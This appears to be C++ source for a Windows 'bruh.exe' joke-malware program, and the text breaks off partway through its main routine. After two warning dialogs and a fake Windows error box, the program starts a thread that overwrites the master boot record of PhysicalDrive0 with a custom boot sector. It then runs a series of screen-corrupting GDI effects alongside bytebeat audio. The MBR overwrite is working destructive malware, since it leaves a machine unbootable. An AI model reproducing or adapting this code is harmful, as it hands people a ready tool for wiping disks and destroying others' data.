typedef struct IUnknown IUnknown;
#include <windows.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
struct Point3D { float x, y, z; };
#define NUM_POINTS 600
#define SPHERE_RADIUS 130.0f
#define PI 3.14159265359f
#include <math.h>
#include <time.h>
#include <tchar.h>
#include <cmath>
#include <cstdint>
#include <algorithm>
#include <wingdi.h>
#include <cstring>
#include <vector>
#include <atomic>
#include <chrono>
#define M_PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }

const unsigned char MBR[]{
	0xE8, 0x03, 0x00, 0xE8, 0x1D, 0x00, 0xB4, 0x00, 0xB0, 0x13, 0xCD, 0x10, 0x68, 0x00, 0xA0, 0x07,
0xB4, 0x0C, 0x30, 0xC0, 0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0xC3, 0x31, 0xC9, 0x31, 0xD2, 0xFF,
0x06, 0x5D, 0x7C, 0xEB, 0x12, 0x81, 0xF9, 0x40, 0x01, 0x73, 0x2D, 0x81, 0xFA, 0xC8, 0x00, 0x73,
0xEA, 0xCD, 0x10, 0x41, 0xEB, 0xED, 0xC3, 0x89, 0xCB, 0x31, 0xD3, 0x88, 0xD8, 0x02, 0x06, 0x5D,
0x7C, 0xC0, 0xE8, 0x02, 0xEB, 0x00, 0x3C, 0x34, 0x77, 0x06, 0x3C, 0x1E, 0x72, 0x06, 0xEB, 0xD5,
0x2C, 0x0D, 0xEB, 0xF2, 0x04, 0x05, 0xEB, 0xEE, 0x31, 0xC9, 0x42, 0xEB, 0xC6, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MBR, 512, &dwBytesWritten, 0);
	return 1;
}
struct V3 { float x, y, z; };
struct P2 { int x, y; };

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
DWORD WINAPI payload1(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	while (1) {
		HDC hdc = GetDC(0);

		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);

		BitBlt(hdc, -3, 0, w, h, hdc, 0, 0, SRCAND);
		BitBlt(hdc, w - 3, 0, w, h, hdc, 0, 0, SRCERASE);

		StretchBlt(hdc, 0, 0, w, h, hdc, w, 0, -w, h, SRCINVERT);

		BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, 0x1900ac010e);
		BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, 0x1900ac010e);

		DeleteObject(brush);

		ReleaseDC(0, hdc);
	}
}


VOID WINAPI bytebeat1()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,  22050,  22050, 1, 8, 0 };


	if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
		return;

	const DWORD size = 22050 * 30;
	unsigned char* buffer = new unsigned char[size];

	for (DWORD t = 0; t < size; ++t)
	{

		buffer[t] = static_cast<unsigned char>(
			(t) * (t >> (14 + (t & t >> 10))));
	}

	WAVEHDR header = {};
	header.lpData = reinterpret_cast<LPSTR>(buffer);
	header.dwBufferLength = size;


	if (waveOutPrepareHeader(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}

	if (waveOutWrite(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}


	while ((header.dwFlags & WHDR_DONE) == 0)
		Sleep(10);

	waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
	waveOutClose(hWaveOut);
	delete[] buffer;
}

DWORD WINAPI waves2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCINVERT);
	for (int t = 0; ; t += 20)
	{
		hdc = GetDC(NULL);
		for (int y = 0; y <= h; y++)
		{
			float x = cos((y + t) * (M_PI / 1000)) * 2000;
			BitBlt(hdc, x, y, w, 1, hcdc, 0, y, SRCCOPY);
		}
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
	}
	Sleep(10);
	ReleaseDC(NULL, hcdc);
	DeleteObject(hcdc);
	DeleteObject(hBitmap);
	return 0;
}
VOID WINAPI bytebeat2()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,  11025,  11025, 1, 8, 0 };


	if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
		return;

	const DWORD size = 11025 * 30;
	unsigned char* buffer = new unsigned char[size];

	for (DWORD t = 0; t < size; ++t)
	{

		buffer[t] = static_cast<unsigned char>(
			(((t * (t >> 3 | t >> 8)) << (1 & t >> 14))));
	}

	WAVEHDR header = {};
	header.lpData = reinterpret_cast<LPSTR>(buffer);
	header.dwBufferLength = size;


	if (waveOutPrepareHeader(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}

	if (waveOutWrite(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}


	while ((header.dwFlags & WHDR_DONE) == 0)
		Sleep(10);

	waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
	waveOutClose(hWaveOut);
	delete[] buffer;
}
DWORD WINAPI payload3(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	HDC hdcCopy = CreateCompatibleDC(hdc);

	BITMAPINFO bmpi = { 0 };

	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);

	float radius = 0.f;
	double angle = 0;

	while (1) {
		HDC hdc = GetDC(0);

		float x = (cos(angle)) * radius;
		float y = (sin(angle)) * radius;

		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);

		BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, PATINVERT);
		BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, SRCERASE);
		StretchBlt(hdc, x, y, sw - x * 2, sh - y * 2, hdc, 0, 0, sw, sh, SRCAND);
		radius += 10.11f;

		DeleteObject(brush);
		ReleaseDC(0, hdc);

		angle = fmod(angle + M_PI / radius, M_PI * radius) / 1.001;
	}
}
VOID WINAPI bytebeat3()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,  11025,  11025, 1, 8, 0 };


	if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
		return;

	const DWORD size = 11025 * 30;
	unsigned char* buffer = new unsigned char[size];

	for (DWORD t = 0; t < size; ++t)
	{

		buffer[t] = static_cast<unsigned char>(
			((t * ((t >> 9 | t >> 11)) & 200)) - 17);
	}

	WAVEHDR header = {};
	header.lpData = reinterpret_cast<LPSTR>(buffer);
	header.dwBufferLength = size;


	if (waveOutPrepareHeader(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}

	if (waveOutWrite(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}


	while ((header.dwFlags & WHDR_DONE) == 0)
		Sleep(10);

	waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
	waveOutClose(hWaveOut);
	delete[] buffer;
}
DWORD WINAPI payload4(LPVOID lpvd) { //credits to simpleemarie
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);

	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, NOTSRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int average = round((float)(rgbScreen[i].b + rgbScreen[i].r + rgbScreen[i].g) / 10);
			rgbScreen[i].r = average + x;
			rgbScreen[i].r = average + y;
			rgbScreen[i].b = average + x;
			rgbScreen[i].rgb -= x;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCINVERT);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
	Sleep(1);
}
VOID WINAPI bytebeat4()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,  11025,  11025, 1, 8, 0 };


	if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
		return;

	const DWORD size = 11025 * 30;
	unsigned char* buffer = new unsigned char[size];

	for (DWORD t = 0; t < size; ++t)
	{

		buffer[t] = static_cast<unsigned char>(
			(t * (1 ^ t >> 9)));
	}

	WAVEHDR header = {};
	header.lpData = reinterpret_cast<LPSTR>(buffer);
	header.dwBufferLength = size;


	if (waveOutPrepareHeader(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}

	if (waveOutWrite(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}


	while ((header.dwFlags & WHDR_DONE) == 0)
		Sleep(10);

	waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
	waveOutClose(hWaveOut);
	delete[] buffer;
}
DWORD WINAPI payload5(LPVOID lpParam) { //If you get the reference, you win absolutely nothing
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, 0x999999);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCINVERT);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, 0x123958);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}
VOID WINAPI bytebeat5()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,  11025,  11025, 1, 8, 0 };


	if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
		return;

	const DWORD size = 11025 * 30;
	unsigned char* buffer = new unsigned char[size];

	for (DWORD t = 0; t < size; ++t)
	{

		buffer[t] = static_cast<unsigned char>(
			(t ^ t >> 93) * (t >> 6 | t >> 11));
	}

	WAVEHDR header = {};
	header.lpData = reinterpret_cast<LPSTR>(buffer);
	header.dwBufferLength = size;


	if (waveOutPrepareHeader(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}

	if (waveOutWrite(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}


	while ((header.dwFlags & WHDR_DONE) == 0)
		Sleep(10);

	waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
	waveOutClose(hWaveOut);
	delete[] buffer;
}
DWORD WINAPI payload6(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	HDC hdcCopy = CreateCompatibleDC(hdc);	BITMAPINFO bmpi = { 0 };
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int radius = 5.f; double angle = 0;
	while (1) {
		HDC hdc = GetDC(0);
		float x = (cos(angle)) * radius, y = (sin(angle)) * radius;
		HBRUSH brush = CreateSolidBrush(RGB(0, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, SRCPAINT);
		BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, SRCINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		angle = fmod(angle + M_PI / radius, M_PI * radius);
	}
}
DWORD WINAPI ahhyes(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	int power = 2;

	int x = w / 2;
	int y = h / 2;


	int signX = 1;
	int signY = 1;

	int increment = 10;

	while (1) {
		HDC hdc = GetDC(NULL);

		for (int angle = 0; angle < 361; angle += M_PI / 2) {
			int x = power * cos(angle * M_PI / 180);
			int y = power * sin(angle * M_PI / 180);
		}

		int radius = x / (1 + y);

		x += increment * signX;
		y += increment * signY;

		if (x + radius >= w) signX = -1;
		if (x - radius <= 0) signX = 1;
		if (y + radius >= h) signY = -1;
		if (y - radius <= 0) signY = 1;

		HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
		SelectObject(hdc, brush);

		Ellipse(hdc, x - radius, y - radius, x + radius, y + radius);
		DeleteObject(brush);

		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}
VOID WINAPI bytebeat6()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,  11025,  11025, 1, 8, 0 };


	if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
		return;

	const DWORD size = 11025 * 30;
	unsigned char* buffer = new unsigned char[size];

	for (DWORD t = 0; t < size; ++t)
	{

		buffer[t] = static_cast<unsigned char>(
			((t * ((t >> 7 | t >> 10)) & 191)) - 16);
	}

	WAVEHDR header = {};
	header.lpData = reinterpret_cast<LPSTR>(buffer);
	header.dwBufferLength = size;


	if (waveOutPrepareHeader(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}

	if (waveOutWrite(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}


	while ((header.dwFlags & WHDR_DONE) == 0)
		Sleep(10);

	waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
	waveOutClose(hWaveOut);
	delete[] buffer;
}

DWORD WINAPI payload7(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);

		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);

		StretchBlt(hdc, -1, -1, w + 20, h + 20, hdc, 0, 0, w, h, 0x999999);

		ReleaseDC(0, hdc);
	}
}

VOID WINAPI bytebeat7()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,  22050,  22050, 1, 8, 0 };


	if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
		return;

	const DWORD size = 22050 * 30;
	unsigned char* buffer = new unsigned char[size];

	for (DWORD t = 0; t < size; ++t)
	{

		buffer[t] = static_cast<unsigned char>(
			((t * ((t >> 9 | t >> 111)) & 122)) - 12);
	}

	WAVEHDR header = {};
	header.lpData = reinterpret_cast<LPSTR>(buffer);
	header.dwBufferLength = size;


	if (waveOutPrepareHeader(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}

	if (waveOutWrite(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}


	while ((header.dwFlags & WHDR_DONE) == 0)
		Sleep(10);

	waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
	waveOutClose(hWaveOut);
	delete[] buffer;
}

DWORD WINAPI icon(LPVOID lpParam) {
	HICON ico = LoadIcon(NULL, IDI_QUESTION);

	V3 v[8] =
	{
		{-1,-1,-1},{1,-1,-1},{1,1,-1},{-1,1,-1},
		{-1,-1, 1},{1,-1, 1},{1,1, 1},{-1,1, 1}
	};

	float cx = 400.0f, cy = 300.0f;
	float vx = 4.0f, vy = 3.0f;
	float ang = 40.0f;

	while (1)
	{
		HDC hdc = GetDC(0);
		int sw = GetSystemMetrics(SM_CXSCREEN);
		int sh = GetSystemMetrics(SM_CYSCREEN);

		cx += vx;
		cy += vy;
		if (cx < 80 || cx > sw - 80) vx = -vx;
		if (cy < 80 || cy > sh - 80) vy = -vy;

		ang += 0.09f;

		float c1 = cosf(ang), s1 = sinf(ang);
		float c2 = cosf(ang * 0.9f), s2 = sinf(ang * 0.9f);

		P2 p[8];

		for (int i = 0; i < 8; i++)
		{
			float x = v[i].x, y = v[i].y, z = v[i].z;
			float y1 = y * c2 - z * s2;
			float z1 = y * s2 + z * c2;
			float x1 = x * c1 - z1 * s1;
			float z2 = x * s1 + z1 * c1;
			float f = 3.0f / (3.0f + z2);
			p[i].x = (int)(cx + x1 * 60 * f);
			p[i].y = (int)(cy + y1 * 60 * f);
		}

		for (int i = 0; i < 8; i++)
			DrawIcon(hdc, p[i].x - 16, p[i].y - 16, ico);

		ReleaseDC(0, hdc);
		Sleep(1);
	}

	return 0;
}
DWORD WINAPI payload8(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		StretchBlt(hdc, -221, -221, w + 222, h + 222, hdc, 0, 0, w, h, 0x9999999);
		ReleaseDC(0, hdc);
	}
}
VOID WINAPI bytebeat8()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,  8000,  8000, 1, 8, 0 };


	if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
		return;

	const DWORD size = 8000 * 30;
	unsigned char* buffer = new unsigned char[size];

	for (DWORD t = 0; t < size; ++t)
	{

		buffer[t] = static_cast<unsigned char>(
			(439 * (6 * t >> 12 | 6 * t >> 2)));
	}

	WAVEHDR header = {};
	header.lpData = reinterpret_cast<LPSTR>(buffer);
	header.dwBufferLength = size;


	if (waveOutPrepareHeader(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}

	if (waveOutWrite(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}


	while ((header.dwFlags & WHDR_DONE) == 0)
		Sleep(10);

	waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
	waveOutClose(hWaveOut);
	delete[] buffer;
}
DWORD WINAPI payload9(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;
	int radius = 67.4f; double angle = 0;
	for (;;) {
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCINVERT);
		for (int i = 0; i < sw * sh; i++) {
			//int x = i % sw, y = i / sh, t = y ^ y | x;
			rgbtriple[i].rgbtRed += 225;
			rgbtriple[i].rgbtGreen += 225;
			rgbtriple[i].rgbtBlue += 225;
		}
		float x = cos(angle) * radius, y = tan(angle) * radius;
		BitBlt(desk, 0, 0, sw, sh, deskMem, x, y, SRCCOPY);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
		angle = fmod(angle + M_PI / radius, M_PI * radius);
		Sleep(1);
	}
}
VOID WINAPI bytebeat9()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,  22050,  22050, 1, 8, 0 };


	if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
		return;

	const DWORD size = 22050 * 30;
	unsigned char* buffer = new unsigned char[size];

	for (DWORD t = 0; t < size; ++t)
	{

		buffer[t] = static_cast<unsigned char>(
			t ^ t / 2 ^ t * t / 133333);
	}

	WAVEHDR header = {};
	header.lpData = reinterpret_cast<LPSTR>(buffer);
	header.dwBufferLength = size;


	if (waveOutPrepareHeader(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}

	if (waveOutWrite(hWaveOut, &header, sizeof(header)) != MMSYSERR_NOERROR)
	{
		waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		delete[] buffer;
		waveOutClose(hWaveOut);
		return;
	}


	while ((header.dwFlags & WHDR_DONE) == 0)
		Sleep(10);

	waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
	waveOutClose(hWaveOut);
	delete[] buffer;
}
int WINAPI WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow
)
{
	if (MessageBoxW(NULL, L"This program contains a huge risk of security and can make you lose data. Do you want to continue?", L"bruh.exe by  crzxymint", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
	if (MessageBoxW(NULL, L"Are you sure you want to run this program? The creator are not responsible for any damages done to your device.\n\nARE YOU SURE?", L"bruh.exe - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
	CreateThread(0, 0, MBRWiper, 0, 0, 0);
	if (MessageBoxW(NULL, L"The NtCreateFile API failed. This error should never be returned to an application, it is a place holder for the Windows Lan Manager Redirector to use in its internal error mapping routines.", L"Windows", MB_ICONERROR | MB_OK) != IDOK) return 1;
	HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);



	bytebeat1();

	TerminateThread(thread1, 0);


	CloseHandle(thread1);


	RedrawWindow(
		NULL,
		NULL,
		NULL,
		RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN
	);
	HANDLE waves2thread = CreateThread(0, 0, waves2, 0, 0, 0);
	bytebeat2();
	TerminateThread(waves2thread, 0);


	CloseHandle(waves2thread);

	HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);

	bytebeat3();
	TerminateThread(thread3, 0);

	CloseHandle(thread3);
	HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
	bytebeat4();
	TerminateThread(thread4, 0);

	CloseHandle(thread4);
	HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
	bytebeat5();
	TerminateThread(thread5, 0);

	CloseHandle(thread5);
	HANDLE thread6 = CreateThread(0, 0, ahhyes, 0, 0, 0);
	HANDLE thread67 = CreateThread(0, 0, payload6, 0, 0, 0);
	bytebeat6();
